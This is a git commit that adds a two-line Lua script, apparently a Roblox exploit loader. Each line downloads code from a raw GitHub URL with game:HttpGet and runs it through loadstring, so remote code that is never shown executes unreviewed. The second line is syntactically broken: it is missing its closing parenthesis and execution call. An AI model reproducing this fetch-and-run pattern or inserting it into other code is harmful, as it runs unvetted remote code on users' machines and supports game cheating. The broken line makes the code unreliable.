945014a393052a7d209774bb96ae1860429be6c4
Miguel7172 <romaozin1607@gmail.com>
2025-08-19 19:42:38 -0300

    Adicionando script3.lua automaticamente

---
+++ script3.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel7172/Loading-UI/refs/heads/main/loading"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kalebmoura545-ctrl/Script/refs/heads/main/script.lua")
